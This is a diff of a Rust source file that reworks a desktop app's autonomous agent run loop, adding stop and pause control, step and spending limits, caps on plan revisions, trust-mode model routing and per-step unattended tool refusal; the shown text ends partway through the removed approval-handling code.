@@ -1,37 +1,39 @@
 use super::*;
-use crate::automation::browser::PlaywrightBridge;
-use crate::automation::AutomationService;
-use crate::core::agent::approval::{
-    ApprovalController, ApprovalRequestPayload, ApprovalResolution, ApprovalScope,
-    ApprovalScopeType,
-};
-use crate::core::llm::LLMRouter;
+use crate::core::agi::executor::{unattended_tool_approval, UNATTENDED_DENIAL_PREFIX};
+use crate::core::agi::executors::{granted_folders_for, GrantedFolders};
+use crate::core::llm::{LLMRouter, RouterPreferences};
+use agiworkforce_model_registry::TrustMode;
 use anyhow::{anyhow, Result};
-use dashmap::DashMap;
-use once_cell::sync::Lazy;
+use async_trait::async_trait;
 use serde_json::json;
+use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use std::time::Duration;
-use sysinfo::System;
-use tauri::{Emitter, Manager};
-use tokio::sync::{oneshot, Mutex as TokioMutex, Notify, RwLock};
+use tauri::Emitter;
+use tokio::sync::{watch, RwLock};
 use tokio::time::sleep;
-
-use super::background_tasks::{AutonomousTaskCheckpoint, TaskStorage};
+use tokio_util::sync::CancellationToken;
 
 const MAX_SELF_HEAL_RETRIES: usize = 3;
-const MAX_PENDING_TASKS: usize = 500;
 const MAX_REPLAN_COUNT: usize = 2;
-/// Timeout for waiting on user approval before the task is automatically failed.
-const APPROVAL_TIMEOUT_SECS: u64 = 300;
-/// Default safety-net cap on autonomous loop iterations to prevent runaway execution.
-/// Can be overridden per-agent via `AgentConfig::max_loop_iterations`.
-const MAX_LOOP_ITERATIONS: usize = 100;
-/// Emit a budget warning event when cumulative cost reaches this fraction of the session cap.
-const BUDGET_WARNING_THRESHOLD: f64 = 0.80;
+/// How many times a running task may have its remaining steps rewritten by
+/// the model, counting replans after a failure and revisions after a step.
+/// Past it the plan is frozen, so a model cannot keep a run alive, or keep
+/// widening it, by revising without end.
+const MAX_PLAN_REVISIONS: usize = 5;
+/// The most times a run may execute a step, retries included, when
+/// `AgentConfig::max_loop_iterations` is 0. Zero there means "use this
+/// default"; any other value is the limit itself. Time spent waiting is not
+/// counted, only steps that actually ran.
+const DEFAULT_MAX_STEP_RUNS: usize = 100;
 /// Maximum number of step outcomes to include in the LLM feedback prompt to avoid
 /// exceeding context limits on smaller models.
 const MAX_FEEDBACK_HISTORY: usize = 20;
+const STEP_PAUSE: Duration = Duration::from_millis(75);
+/// How much of one step's output is carried into the run's report.
+const STEP_OUTPUT_CHARS: usize = 2_000;
+/// How many steps the run's report lists, most recent last.
+const REPORTED_STEPS: usize = 50;
 
 /// Tracks a completed step's description and its execution result so that
 /// subsequent LLM consultations have full context of what happened.
@@ -42,76 +44,517 @@ struct StepOutcome {
     result: String,
 }
 
-/// Global registry of pending task approvals.
-///
-/// When the autonomous agent suspends a task awaiting user approval, it inserts
-/// a `oneshot::Sender<bool>` here keyed by task ID. The `resolve_task_approval`
-/// Tauri command looks up the sender and delivers the user's decision, waking
-/// the suspended task.
-pub static PENDING_TASK_APPROVALS: Lazy<DashMap<String, oneshot::Sender<bool>>> =
-    Lazy::new(DashMap::new);
+/// Why a run was told to stop.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum StopReason {
+    Cancelled,
+    TimeLimit,
+    AppClosing,
+}
+
+/// A run that was told to stop before the work it was waiting on finished.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct Stopped(pub StopReason);
+
+/// The one switch that stops or pauses a run. Every model call, every step
+/// and every wait inside the run is raced against `stop`, so a stop drops the
+/// work in flight at once, and a child process a step started dies with it.
+/// A pause takes effect at the next step boundary, so the step in flight
+/// finishes and resuming never runs a step twice.
+#[derive(Clone)]
+pub struct RunControl {
+    stop: CancellationToken,
+    reason: Arc<parking_lot::Mutex<Option<StopReason>>>,
+    paused: Arc<watch::Sender<bool>>,
+    progress: Arc<watch::Sender<Option<StepProgress>>>,
+}
+
+/// Where a run stands, for whoever shows it: the step it is on, counted from
+/// one, out of how many the plan holds now.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct StepProgress {
+    pub step: usize,
+    pub total: usize,
+    pub description: String,
+}
+
+impl Default for RunControl {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+impl RunControl {
+    pub fn new() -> Self {
+        let (paused, _) = watch::channel(false);
+        let (progress, _) = watch::channel(None);
+        Self {
+            stop: CancellationToken::new(),
+            reason: Arc::new(parking_lot::Mutex::new(None)),
+            paused: Arc::new(paused),
+            progress: Arc::new(progress),
+        }
+    }
+
+    fn report_step(&self, progress: StepProgress) {
+        let _ = self.progress.send_replace(Some(progress));
+    }
+
+    /// Follows the run's progress; the latest step replaces the one before.
+    pub fn progress(&self) -> watch::Receiver<Option<StepProgress>> {
+        self.progress.subscribe()
+    }
+
+    /// The first reason given is the one the run ends with.
+    pub fn stop(&self, reason: StopReason) {
+        {
+            let mut first = self.reason.lock();
+            if first.is_none() {
+                *first = Some(reason);
+            }
+        }
+        self.stop.cancel();
+    }
+
+    pub fn stop_reason(&self) -> Option<StopReason> {
+        *self.reason.lock()
+    }
+
+    pub fn pause(&self) {
+        let _ = self.paused.send_replace(true);
+    }
+
+    pub fn resume(&self) {
+        let _ = self.paused.send_replace(false);
+    }
+
+    pub fn is_paused(&self) -> bool {
+        *self.paused.borrow()
+    }
+
+    fn stopped(&self) -> Stopped {
+        Stopped(self.stop_reason().unwrap_or(StopReason::Cancelled))
+    }
+
+    /// Runs `work` to its end unless the run is stopped first.
+    pub async fn unless_stopped<F: std::future::Future>(
+        &self,
+        work: F,
+    ) -> std::result::Result<F::Output, Stopped> {
+        tokio::select! {
+            biased;
+            _ = self.stop.cancelled() => Err(self.stopped()),
+            output = work => Ok(output),
+        }
+    }
+
+    /// The boundary between steps: refuses to go on once stopped, and holds
+    /// a paused run here until it is resumed or stopped.
+    pub async fn checkpoint(&self) -> std::result::Result<(), Stopped> {
+        let mut paused = self.paused.subscribe();
+        loop {
+            if self.stop.is_cancelled() {
+                return Err(self.stopped());
+            }
+            if !*paused.borrow_and_update() {
+                return Ok(());
+            }
+            tokio::select! {
+                _ = self.stop.cancelled() => return Err(self.stopped()),
+                changed = paused.changed() => {
+                    if changed.is_err() {
+                        return Ok(());
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// What a finished run produced.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct RunReport {
+    /// The model's own account of what the run did and found.
+    pub summary: String,
+    /// Each step that ran with what it returned, bounded.
+    pub steps: Vec<String>,
+    /// Plan changes the model asked for that were not adopted.
+    pub notes: Vec<String>,
+}
+
+/// How a run ended.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum RunEnd {
+    Completed(RunReport),
+    Failed(String),
+    Stopped(StopReason),
+}
+
+struct RunLimits {
+    max_step_runs: usize,
+    spend_cap: f64,
+    spend_at_start: f64,
+}
+
+#[derive(Default)]
+struct RunState {
+    step_index: usize,
+    step_runs: usize,
+    plan_revisions: usize,
+    completed: Vec<String>,
+    outcomes: Vec<StepOutcome>,
+    notes: Vec<String>,
+}
+
+#[derive(Debug, PartialEq, Eq)]
+enum Drive {
+    Done,
+    Failed(String),
+    Stopped(StopReason),
+}
+
+/// Everything the step loop needs from outside itself, so the loop's stop,
+/// pause and limit behaviour can be driven without a model or a desktop.
+#[async_trait]
+trait RunHost: Sync {
+    fn emit(&self, event: &str, payload: serde_json::Value);
+    /// The step with its file path made absolute, once, so the rule that
+    /// judges it, the folder check and the executor all name the same file.
+    async fn in_project(&self, step: TaskStep) -> TaskStep;
+    async fn refusal(&self, action: &Action) -> Option<String>;
+    fn revision_refusal(&self, revisions_so_far: usize, revised: &[TaskStep]) -> Option<String>;
+    async fn run_step(&self, step: &TaskStep) -> Result<StepResult>;
+    async fn replan(
+        &self,
+        failed_step: &str,
+        error: &str,
+        completed: &[String],
+        goal: &str,
+    ) -> Result<Vec<TaskStep>>;
+    async fn revise(
+        &self,
+        goal: &str,
+        outcomes: &[StepOutcome],
+        remaining: &[TaskStep],
+    ) -> Result<Option<Vec<TaskStep>>>;
+    async fn spend(&self) -> f64;
+}
+
+fn bounded_output(text: &str) -> String {
+    match text.char_indices().nth(STEP_OUTPUT_CHARS) {
+        Some((cut, _)) => format!("{}...", &text[..cut]),
+        None => text.to_string(),
+    }
+}
+
+/// Runs the plan from where `state` says it stands. It returns at a stop, at
+/// a failure or when the last step is done; a pause is waited out inside, so
+/// a resumed run goes on from the same step.
+async fn drive<H: RunHost>(
+    host: &H,
+    task: &mut Task,
+    state: &mut RunState,
+    control: &RunControl,
+    limits: &RunLimits,
+) -> Drive {
+    while state.step_index < task.steps.len() {
+        if let Err(Stopped(reason)) = control.checkpoint().await {
+            return Drive::Stopped(reason);
+        }
+        let step_index = state.step_index;
+        task.current_step = step_index;
+        task.updated_at = std::time::Instant::now();
+
+        let spent = host.spend().await - limits.spend_at_start;
+        if spent > limits.spend_cap {
+            return Drive::Failed(format!(
+                "The agent stopped at its spending limit: it had spent ${:.2} of ${:.2}.",
+                spent, limits.spend_cap
+            ));
+        }
+
+        host.emit(
+            "agent:step-started",
+            json!({
+                "taskId": task.id,
+                "step": task.steps[step_index].description,
+                "stepIndex": step_index,
+                "totalSteps": task.steps.len()
+            }),
+        );
+        control.report_step(StepProgress {
+            step: step_index + 1,
+            total: task.steps.len(),
+            description: task.steps[step_index].description.clone(),
+        });
+
+        let mut attempt = 0usize;
+        let mut step_succeeded = false;
+        loop {
+            attempt += 1;
+            if let Err(Stopped(reason)) = control.checkpoint().await {
+                return Drive::Stopped(reason);
+            }
+            let step = host.in_project(task.steps[step_index].clone()).await;
+            if let Some(refusal) = host.refusal(&step.action).await {
+                tracing::warn!("[Agent] Step {} refused: {}", step.id, refusal);
+                return Drive::Failed(refusal);
+            }
+            if state.step_runs >= limits.max_step_runs {
+                return Drive::Failed(format!(
+                    "The agent stopped at its step limit ({} step runs).",
+                    limits.max_step_runs
+                ));
+            }
+            state.step_runs += 1;
+
+            let step_result = match control.unless_stopped(host.run_step(&step)).await {
+                Ok(step_result) => step_result,
+                Err(Stopped(reason)) => return Drive::Stopped(reason),
+            };
+            let failure = match step_result {
+                Ok(result) if result.success => {
+                    let output = bounded_output(result.result.as_deref().unwrap_or("OK"));
+                    tracing::info!("[Agent] Step {} completed", step.id);
+                    host.emit(
+                        "agent:step-completed",
+                        json!({
+                            "taskId": task.id,
+                            "step": step.description,
+                            "result": output,
+                            "stepIndex": step_index
+                        }),
+                    );
+                    state
+                        .completed
+                        .push(format!("{}: {}", step.id, step.description));
+                    state.outcomes.push(StepOutcome {
+                        step_id: step.id.clone(),
+                        description: step.description.clone(),
+                        result: output,
+                    });
+                    step_succeeded = true;
+                    break;
+                }
+                Ok(result) => result.error.unwrap_or_else(|| "Unknown error".to_string()),
+                Err(error) => error.to_string(),
+            };
+
+            let will_retry =
+                task.retry_count < task.max_retries && attempt <= MAX_SELF_HEAL_RETRIES;
+            tracing::warn!("[Agent] Step {} failed: {}", step.id, failure);
+            host.emit(
+                "agent:step-failed",
+                json!({
+                    "taskId": task.id,
+                    "step": step.description,
+                    "error": failure,
+                    "attempt": attempt,
+                    "retrying": will_retry
+                }),
+            );
+            if !will_retry {
+                return Drive::Failed(format!("Step {} failed: {}", step.id, failure));
+            }
+            task.retry_count += 1;
+
+            let may_replan = attempt == 2
+                && task.replan_count < MAX_REPLAN_COUNT
+                && state.plan_revisions < MAX_PLAN_REVISIONS;
+            if !may_replan {
+                continue;
+            }
+            let replanned = match control
+                .unless_stopped(host.replan(
+                    &step.description,
+                    &failure,
+                    &state.completed,
+                    &task.description,
+                ))
+                .await
+            {
+                Ok(replanned) => replanned,
+                Err(Stopped(reason)) => return Drive::Stopped(reason),
+            };
+            match replanned {
+                Ok(new_steps) if new_steps.is_empty() => {
+                    tracing::warn!("[Agent] Replan returned 0 steps, falling back to blind retry");
+                }
+                Ok(new_steps) => {
+                    if let Some(refused) = host.revision_refusal(state.plan_revisions, &new_steps) {
+                        let note = revision_not_adopted(&refused);
+                        tracing::warn!("[Agent] {}", note);
+                        host.emit(
+                            "agent:step-failed",
+                            json!({
+                                "taskId": task.id,
+                                "step": step.description,
+                                "error": format!("{failure}\n{note}"),
+                                "attempt": attempt,
+                                "retrying": true
+                            }),
+                        );
+                        state.notes.push(note);
+                        continue;
+                    }
+                    state.plan_revisions += 1;
+                    task.steps.truncate(step_index);
+                    task.steps.extend(new_steps);
+                    task.retry_count = 0;
+                    task.replan_count += 1;
+                    break;
+                }
+                Err(error) => {
+                    tracing::warn!(
+                        "[Agent] Replan failed ({}), falling back to blind retry",
+                        error
+                    );
+                }
+            }
+        }
+
+        if step_succeeded {
+            if step_index + 1 < task.steps.len() && state.plan_revisions < MAX_PLAN_REVISIONS {
+                let revised = match control
+                    .unless_stopped(host.revise(
+                        &task.description,
+                        &state.outcomes,
+                        &task.steps[step_index + 1..],
+                    ))
+                    .await
+                {
+                    Ok(revised) => revised,
+                    Err(Stopped(reason)) => return Drive::Stopped(reason),
+                };
+                match revised {
+                    Ok(Some(revised)) if revised.is_empty() => {}
+                    Ok(Some(revised)) => {
+                        if let Some(refused) = host.revision_refusal(state.plan_revisions, &revised)
+                        {
+                            let note = revision_not_adopted(&refused);
+                            tracing::warn!("[Agent] {}", note);
+                            let output = state
+                                .outcomes
+                                .last()
+                                .map(|outcome| outcome.result.as_str())
+                                .unwrap_or_default();
+                            host.emit(
+                                "agent:step-completed",
+                                json!({
+                                    "taskId": task.id,
+                                    "step": task.steps[step_index].description,
+                                    "result": format!("{output}\n{note}"),
+                                    "stepIndex": step_index
+                                }),
+                            );
+                            state.notes.push(note);
+                        } else {
+                            task.steps.truncate(step_index + 1);
+                            task.steps.extend(revised);
+                            state.plan_revisions += 1;
+                        }
+                    }
+                    Ok(None) => {}
+                    Err(error) => {
+                        tracing::warn!(
+                            "[Agent] LLM feedback consultation failed ({}), continuing with original plan",
+                            error
+                        );
+                    }
+                }
+            }
+            state.step_index += 1;
+        }
+
+        if let Err(Stopped(reason)) = control.unless_stopped(sleep(STEP_PAUSE)).await {
+            return Drive::Stopped(reason);
+        }
+    }
+    Drive::Done
+}
+
+/// Why a run could not be planned, for the person reading it: which model was
+/// asked, what came back, and what to do about it.
+fn planning_failure(trust_mode: TrustMode, error: &str) -> String {
+    let (asked, next) = match trust_mode {
+        TrustMode::Local | TrustMode::OnDevice => (
+            "a model on this computer",
+            "Start your local model runtime and pick a model, or switch the app to Cloud, then start the run again. A run started in Local mode is never sent to a cloud model.",
+        ),
+        TrustMode::Byok => (
+            "the provider your own key is for",
+            "Check the key in Settings, then start the run again.",
+        ),
+        TrustMode::ManagedCloud => (
+            "AGI Cloud",
+            "Check that you are signed in and online, then start the run again.",
+        ),
+    };
+    format!(
+        "The run could not be planned. It asked {asked} for a plan and got none: {error}. {next}"
+    )
+}
+
+fn reported_steps(outcomes: &[StepOutcome]) -> Vec<String> {
+    let skipped = outcomes.len().saturating_sub(REPORTED_STEPS);
+    outcomes[skipped..]
+        .iter()
+        .map(|outcome| format!("{}: {}", outcome.description, outcome.result))
+        .collect()
+}
+
+/// What the run reports when the model's closing summary cannot be had: the
+/// last step's own output, which is what the plan was building towards.
+fn fallback_summary(outcomes: &[StepOutcome]) -> String {
+    outcomes
+        .last()
+        .map(|outcome| format!("{}: {}", outcome.description, outcome.result))
+        .unwrap_or_default()
+}
 
 pub struct AutonomousAgent {
     config: AgentConfig,
-    automation: Arc<AutomationService>,
     router: Arc<RwLock<LLMRouter>>,
     planner: TaskPlanner,
     executor: TaskExecutor,
     vision: VisionAutomation,
-    approval: ApprovalManager,
-    task_queue: Arc<parking_lot::Mutex<Vec<Task>>>,
-    running_tasks: Arc<parking_lot::Mutex<Vec<String>>>,
-    stop_signal: Arc<parking_lot::Mutex<bool>>,
-    /// Notified when a task reaches a terminal state, waking `run_goal` waiters.
-    task_notify: Arc<Notify>,
     app_handle: Option<tauri::AppHandle>,
-    /// Optional persistent storage for autonomous task checkpoints.
-    /// When set, the agent saves a checkpoint after each successful step
-    /// so tasks can be resumed across app restarts.
-    task_storage: Option<Arc<TaskStorage>>,
-    /// Optional CDP browser bridge for in-process navigation.
-    /// Shared with the `TaskExecutor` so Navigate actions target the CDP-controlled browser.
-    browser_bridge: Option<Arc<TokioMutex<PlaywrightBridge>>>,
+    /// The boundary every model call of this run stays inside. It is fixed
+    /// when the run starts, so a run begun on this computer is never sent to
+    /// a cloud model part way through.
+    trust_mode: TrustMode,
+    /// The folder relative paths are read against, when the run was started
+    /// with one; otherwise the project that is open.
+    working_folder: Option<PathBuf>,
 }
 
 impl AutonomousAgent {
     pub fn new(
         config: AgentConfig,
-        automation: Arc<AutomationService>,
         router: Arc<RwLock<LLMRouter>>,
+        trust_mode: TrustMode,
     ) -> Result<Self> {
-        Self::with_browser_bridge(config, automation, router, None)
-    }
-
-    /// Creates an `AutonomousAgent` with an optional CDP browser bridge.
-    /// When provided, `Action::Navigate` uses CDP instead of OS-level open.
-    pub fn with_browser_bridge(
-        config: AgentConfig,
-        automation: Arc<AutomationService>,
-        router: Arc<RwLock<LLMRouter>>,
-        browser_bridge: Option<Arc<TokioMutex<PlaywrightBridge>>>,
-    ) -> Result<Self> {
-        let planner = TaskPlanner::new(router.clone())?;
-        let executor = TaskExecutor::new(automation.clone(), browser_bridge.clone())?;
-        let vision = VisionAutomation::new()?;
-        let approval = ApprovalManager::new(config.clone());
-
         Ok(Self {
             config,
-            automation,
+            planner: TaskPlanner::new(router.clone())?,
+            executor: TaskExecutor::new(None)?,
+            vision: VisionAutomation::new()?,
             router,
-            planner,
-            executor,
-            vision,
-            approval,
-            task_queue: Arc::new(parking_lot::Mutex::new(Vec::new())),
-            running_tasks: Arc::new(parking_lot::Mutex::new(Vec::new())),
-            stop_signal: Arc::new(parking_lot::Mutex::new(false)),
-            task_notify: Arc::new(Notify::new()),
             app_handle: None,
-            task_storage: None,
-            browser_bridge,
+            trust_mode,
+            working_folder: None,
         })
+    }
+
+    pub fn set_working_folder(&mut self, folder: PathBuf) {
+        self.working_folder = Some(folder);
+    }
+
+    fn model_route(&self) -> RouterPreferences {
+        RouterPreferences {
+            trust_mode: Some(self.trust_mode),
+            ..RouterPreferences::default()
+        }
     }
 
     /// Set the Tauri AppHandle so the agent can emit events to the frontend.
@@ -119,156 +562,48 @@ impl AutonomousAgent {
         self.app_handle = Some(handle);
     }
 
-    /// Set persistent storage for autonomous task checkpoints.
-    /// When set, the agent saves a checkpoint after each successful step.
-    pub fn set_task_storage(&mut self, storage: Arc<TaskStorage>) {
-        self.task_storage = Some(storage);
-    }
-
-    pub async fn start(&self) -> Result<()> {
-        self.run_autonomous_loop().await
-    }
-
-    pub async fn run_autonomous_loop(&self) -> Result<()> {
-        tracing::info!("[Agent] Starting autonomous agent loop");
-        *self.stop_signal.lock() = false;
-
-        let mut iteration: usize = 0;
-        let mut budget_warning_emitted = false;
-        // Use config override if set (non-zero), otherwise fall back to compile-time default.
-        let max_iterations = if self.config.max_loop_iterations > 0 {
-            self.config.max_loop_iterations
-        } else {
-            MAX_LOOP_ITERATIONS
-        };
-        // Reuse a single System instance across loop iterations to avoid
-        // the cost of re-scanning all processes via new_all() on every 50ms tick.
-        let mut sys = System::new();
-
-        loop {
-            if *self.stop_signal.lock() {
-                tracing::info!("[Agent] Stop signal received, shutting down");
-                break;
-            }
-
-            // Safety-net iteration cap to prevent runaway loops.
-            iteration += 1;
-            if iteration > max_iterations {
-                tracing::warn!(
-                    "[Agent] Iteration limit ({}) reached, shutting down autonomous loop",
-                    max_iterations
-                );
-                if let Some(ref handle) = self.app_handle {
-                    if let Err(e) = handle.emit(
-                        "agent:loop-iteration-limit",
-                        json!({
-                            "maxIterations": max_iterations,
-                            "message": format!(
-                                "Autonomous loop stopped after {} iterations (safety limit)",
-                                max_iterations
-                            )
-                        }),
-                    ) {
-                        tracing::warn!("Failed to emit agent:loop-iteration-limit: {}", e);
-                    }
-                }
-                break;
-            }
-
-            // Per-iteration budget check: compare cumulative cost against session cap.
-            let cumulative_cost = self.router.read().await.get_cumulative_cost();
-            if cumulative_cost > self.config.effective_session_cap_usd() {
-                tracing::warn!(
-                    "[Agent] Session budget exceeded (${:.2} > ${:.2}), stopping autonomous loop",
-                    cumulative_cost,
-                    self.config.effective_session_cap_usd()
-                );
-                if let Some(ref handle) = self.app_handle {
-                    if let Err(e) = handle.emit(
-                        "agent:budget-exceeded",
-                        json!({
-                            "cumulativeCost": cumulative_cost,
-                            "sessionLimit": self.config.effective_session_cap_usd(),
-                            "message": format!(
-                                "Budget exceeded: ${:.2} spent of ${:.2} limit",
-                                cumulative_cost, self.config.effective_session_cap_usd()
-                            )
-                        }),
-                    ) {
-                        tracing::warn!("Failed to emit agent:budget-exceeded: {}", e);
-                    }
-                }
-                break;
-            }
-
-            // Emit a one-time warning when approaching the budget threshold.
-            if !budget_warning_emitted
-                && cumulative_cost
-                    > self.config.effective_session_cap_usd() * BUDGET_WARNING_THRESHOLD
-            {
-                budget_warning_emitted = true;
-                let pct =
-                    (cumulative_cost / self.config.effective_session_cap_usd() * 100.0) as u32;
-                tracing::warn!(
-                    "[Agent] Budget warning: ${:.2} spent ({}% of ${:.2} limit)",
-                    cumulative_cost,
-                    pct,
-                    self.config.effective_session_cap_usd()
-                );
-                if let Some(ref handle) = self.app_handle {
-                    if let Err(e) = handle.emit(
-                        "agent:budget-warning",
-                        json!({
-                            "cumulativeCost": cumulative_cost,
-                            "sessionLimit": self.config.effective_session_cap_usd(),
-                            "percentUsed": pct,
-                            "message": format!(
-                                "Budget warning: {}% of session limit used (${:.2} of ${:.2})",
-                                pct, cumulative_cost, self.config.effective_session_cap_usd()
-                            )
-                        }),
-                    ) {
-                        tracing::warn!("Failed to emit agent:budget-warning: {}", e);
-                    }
-                }
-            }
-
-            // Only check system resource usage every 10 iterations (~500ms) to avoid
-            // the overhead of sysinfo refresh on every 50ms tick.
-            if iteration.is_multiple_of(10) && !self.check_resource_limits(&mut sys).await? {
-                tracing::warn!("[Agent] Resource limits exceeded, pausing");
-                sleep(Duration::from_secs(5)).await;
-                continue;
-            }
-
-            self.process_task_queue().await?;
-
-            sleep(Duration::from_millis(50)).await;
+    fn run_limits(&self, spend_at_start: f64) -> RunLimits {
+        RunLimits {
+            max_step_runs: if self.config.max_loop_iterations > 0 {
+                self.config.max_loop_iterations
+            } else {
+                DEFAULT_MAX_STEP_RUNS
+            },
+            spend_cap: self
+                .config
+                .max_cost_per_task
+                .min(self.config.effective_session_cap_usd()),
+            spend_at_start,
         }
-
-        Ok(())
     }
 
-    pub fn stop(&self) {
-        tracing::info!("[Agent] Stopping autonomous agent");
-        *self.stop_signal.lock() = true;
-    }
+    /// Plans a goal and runs it to its end inside the calling task. Nothing
+    /// is spawned, so when `control` stops the run, or the caller drops this
+    /// future, no step or model call goes on afterwards.
+    ///
+    /// Nobody is there to approve a plan, so no plan is ever approved: every
+    /// step, in the first plan and in each revision, meets the unattended tool
+    /// policy on its own.
+    ///
+    /// The router keeps one running total for the whole app, so the run's
+    /// spend is measured from where that total stood when the run began.
+    pub async fn run_goal(&self, goal: String, control: &RunControl) -> RunEnd {
+        let spend_at_start = self.router.read().await.get_cumulative_cost();
+        let planned = control
+            .unless_stopped(self.planner.plan_task(&goal, self.model_route()))
+            .await;
+        let steps = match planned {
+            Err(Stopped(reason)) => return RunEnd::Stopped(reason),
+            Ok(Err(error)) => {
+                return RunEnd::Failed(planning_failure(self.trust_mode, &error.to_string()))
+            }
+            Ok(Ok(steps)) => steps,
+        };
 
-    pub async fn submit_task(
-        &self,
-        description: String,
-        auto_approve: Option<bool>,
-    ) -> Result<String> {
-        let task_id = format!("task_{}", &uuid::Uuid::new_v4().to_string()[..12]);
-        let auto_approve = auto_approve.unwrap_or(self.config.auto_approve);
-
-        tracing::info!("[Agent] Planning task: {}", description);
-        let steps = self.planner.plan_task(&description).await?;
-
-        let task = Task {
-            id: task_id.clone(),
-            description,
-            status: TaskStatus::Pending,
+        let mut task = Task {
+            id: format!("task_{}", &uuid::Uuid::new_v4().to_string()[..12]),
+            description: goal,
+            status: TaskStatus::Executing,
             created_at: std::time::Instant::now(),
             updated_at: std::time::Instant::now(),
             steps,
@@ -276,979 +611,119 @@ impl AutonomousAgent {
             max_retries: self.config.max_retries,
             retry_count: 0,
             replan_count: 0,
-            requires_approval: !auto_approve,
-            auto_approve,
+        };
+        tracing::info!("[Agent] Executing task {}", task.id);
+
+        let mut state = RunState::default();
+        let limits = self.run_limits(spend_at_start);
+        let end = match self.plan_refusal(&task) {
+            Some(refusal) => Drive::Failed(refusal),
+            None => drive(self, &mut task, &mut state, control, &limits).await,
         };
 
-        {
-            let mut queue = self.task_queue.lock();
-            let pending_count = queue
-                .iter()
-                .filter(|t| matches!(t.status, TaskStatus::Pending | TaskStatus::WaitingApproval))
-                .count();
-            if pending_count >= MAX_PENDING_TASKS {
-                return Err(anyhow!(
-                    "Task queue full ({} pending tasks)",
-                    MAX_PENDING_TASKS
-                ));
-            }
-            queue.push(task);
-        }
-
-        tracing::info!("[Agent] Task {} queued for execution", task_id);
-        Ok(task_id)
-    }
-
-    /// Convenience method for background agents: plans and executes a goal
-    /// synchronously (blocks until complete or fails). Returns a human-readable
-    /// completion message.
-    ///
-    /// This combines submit_task + process_task_queue polling into a single call.
-    /// Uses auto_approve=true since background agents run unattended.
-    pub async fn run_goal(&self, goal: String) -> Result<String> {
-        let task_id = self.submit_task(goal, Some(true)).await?;
-
-        let timeout = std::time::Duration::from_secs(86400); // 24h max
-        let start = std::time::Instant::now();
-        let mut iteration: usize = 0;
-        let max_iterations = if self.config.max_loop_iterations > 0 {
-            self.config.max_loop_iterations
-        } else {
-            MAX_LOOP_ITERATIONS
-        };
-
-        loop {
-            if start.elapsed() > timeout {
-                return Err(anyhow!("run_goal timed out after 24 hours"));
-            }
-
-            // Enforce iteration limit (same as run_autonomous_loop)
-            iteration += 1;
-            if iteration > max_iterations {
-                return Err(anyhow!(
-                    "run_goal exceeded max iterations ({})",
-                    max_iterations
-                ));
-            }
-
-            // Enforce cumulative cost cap (same as run_autonomous_loop)
-            if let Ok(router) = self.router.try_read() {
-                let cost = router.get_cumulative_cost();
-                if cost > self.config.effective_session_cap_usd() {
-                    return Err(anyhow!(
-                        "run_goal exceeded session cost cap (${:.2} > ${:.2})",
-                        cost,
-                        self.config.effective_session_cap_usd()
-                    ));
-                }
-            }
-
-            // Process one cycle of the task queue
-            self.process_task_queue().await?;
-
-            // Check if our task is done
-            if let Some(task) = self.get_task_status(&task_id)? {
-                match &task.status {
-                    TaskStatus::Completed => {
-                        return Ok(format!("Task completed: {}", task.description));
-                    }
-                    TaskStatus::Failed(err) => {
-                        return Err(anyhow!("Task failed: {}", err));
-                    }
-                    TaskStatus::Cancelled => {
-                        return Err(anyhow!("Task was cancelled"));
-                    }
-                    _ => {
-                        // Still running, wait for notification instead of busy-polling
-                    }
-                }
-            } else {
-                return Err(anyhow!("Task {} disappeared from queue", task_id));
-            }
-
-            // Wait for a task to change state, with a 5s fallback to re-check
-            tokio::time::timeout(
-                std::time::Duration::from_secs(5),
-                self.task_notify.notified(),
-            )
-            .await
-            .ok(); // timeout is fine, just re-loop and check
-        }
-    }
-
-    pub(crate) async fn process_task_queue(&self) -> Result<()> {
-        {
-            let running = self.running_tasks.lock();
-            if running.len() >= self.config.max_concurrent_tasks {
-                return Ok(());
-            }
-        }
-
-        let (task_id, requires_approval_check) = {
-            let mut queue = self.task_queue.lock();
-            if let Some(task) = queue.iter_mut().find(|t| t.status == TaskStatus::Pending) {
-                let task_id = task.id.clone();
-                let requires_approval = task.requires_approval && !task.auto_approve;
-                task.status = TaskStatus::Planning;
-                (task_id, requires_approval)
-            } else {
-                return Ok(());
-            }
-        };
-
-        if requires_approval_check {
-            let task_clone = {
-                let queue = self.task_queue.lock();
-                queue.iter().find(|t| t.id == task_id).cloned()
-            };
-
-            if let Some(task) = task_clone {
-                // ISSUE-08 fix: Timeout on should_approve to prevent indefinite hangs.
-                // On timeout, default to requiring explicit approval (false).
-                let should_auto = match tokio::time::timeout(
-                    Duration::from_secs(30),
-                    self.approval.should_approve(&task),
-                )
-                .await
-                {
-                    Ok(Ok(v)) => v,
-                    Ok(Err(e)) => {
-                        tracing::warn!(
-                            "[Agent] should_approve errored for task {}: {}, defaulting to require approval",
-                            task_id, e
-                        );
-                        false
-                    }
-                    Err(_) => {
-                        tracing::warn!(
-                            "[Agent] should_approve timed out (30s) for task {}, defaulting to require approval",
-                            task_id
-                        );
-                        false
-                    }
-                };
-                if !should_auto {
-                    tracing::info!(
-                        "[Agent] Task {} requires approval, escalating to ApprovalController",
-                        task_id
-                    );
-
-                    {
-                        let mut queue = self.task_queue.lock();
-                        if let Some(t) = queue.iter_mut().find(|t| t.id == task_id) {
-                            t.status = TaskStatus::WaitingApproval;
-                        }
-                    }
-
-                    // Escalate to ApprovalController for interactive user approval.
-                    // Falls back to the legacy PENDING_TASK_APPROVALS oneshot channel
-                    // if the controller is unavailable (no app_handle or state not managed).
-                    let controller_available = self
-                        .app_handle
-                        .as_ref()
-                        .and_then(|h| h.try_state::<ApprovalController>())
-                        .is_some();
-
-                    if let (Some(ref handle), true) = (&self.app_handle, controller_available) {
-                        let payload = build_approval_payload(&task);
-                        let agent_clone = self.clone_for_task()?;
-                        let approval_task_id = task_id.clone();
-                        let app_handle_clone = handle.clone();
-
-                        self.running_tasks.lock().push(task_id);
-
-                        // Spawn to avoid blocking the task queue processor.
-                        // Uses ApprovalController::request_approval which emits
-                        // `agent:permission_required`, waits for user response via
-                        // oneshot channel, and integrates with the trust store.
-                        let task_notify = self.task_notify.clone();
-                        let running_tasks = self.running_tasks.clone();
-                        let task_queue = self.task_queue.clone();
